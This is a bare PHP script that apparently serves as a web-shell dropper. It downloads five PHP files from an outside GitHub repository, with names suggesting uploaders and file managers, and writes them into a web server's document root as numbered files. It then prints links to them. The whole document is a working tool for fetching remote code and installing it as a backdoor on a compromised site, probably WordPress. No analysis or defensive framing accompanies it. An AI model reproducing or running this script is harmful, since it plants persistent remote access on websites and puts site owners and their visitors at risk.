<?php

// Array of GitHub raw file URLs
$githubRawFileUrls = [
    'https://raw.githubusercontent.com/sidhelchor/log/main/wp.php',
    'https://raw.githubusercontent.com/sidhelchor/log/main/uplo.php',
    'https://raw.githubusercontent.com/sidhelchor/log/main/li.php',
    'https://raw.githubusercontent.com/sidhelchor/log/main/minik.php',
    'https://raw.githubusercontent.com/sidhelchor/log/main/tiny.php'
];

// Initialize a counter
$fileCounter = 1;

// Array to store the downloaded file paths along with their WordPress paths
$downloadedFiles = [];

// Loop through each URL
foreach ($githubRawFileUrls as $url) {
    // Fetch content from GitHub file
    $content = file_get_contents($url);

    if ($content !== false) {
        // Extract file extension from the URL
        $fileExtension = pathinfo($url, PATHINFO_EXTENSION);

        // Formulate the filename with the counter and file extension
        $filename = $fileCounter . '.' . $fileExtension;

        // Path to save the file within wp-content using $_SERVER['DOCUMENT_ROOT']
        $localFilePath = $_SERVER['DOCUMENT_ROOT'] . "/$filename";

        // Write content to a new file within wp-content using $_SERVER['DOCUMENT_ROOT']
        $fileWriteResult = file_put_contents($localFilePath, $content);

        if ($fileWriteResult !== false) {
            // Store the downloaded file paths along with their WordPress paths
            $downloadedFiles[$url] = [
                'wordpress_path' => $localFilePath,
                'url' => $url
            ];
        }

        // Increment the counter for the next file
        $fileCounter++;
    }
}

// Display links to the downloaded files
if (!empty($downloadedFiles)) {
    echo "<h2>Downloaded Files:</h2>";
    foreach ($downloadedFiles as $downloadedFile) {
        $wordpressPath = $downloadedFile['wordpress_path'];
        $fileUrl = str_replace($_SERVER['DOCUMENT_ROOT'], '', $wordpressPath);
        echo "<p>File: <a href='$fileUrl'>$fileUrl</a><br> Original URL: {$downloadedFile['url']}</p>";
    }
} else {
    echo "No files downloaded.";
}

?>
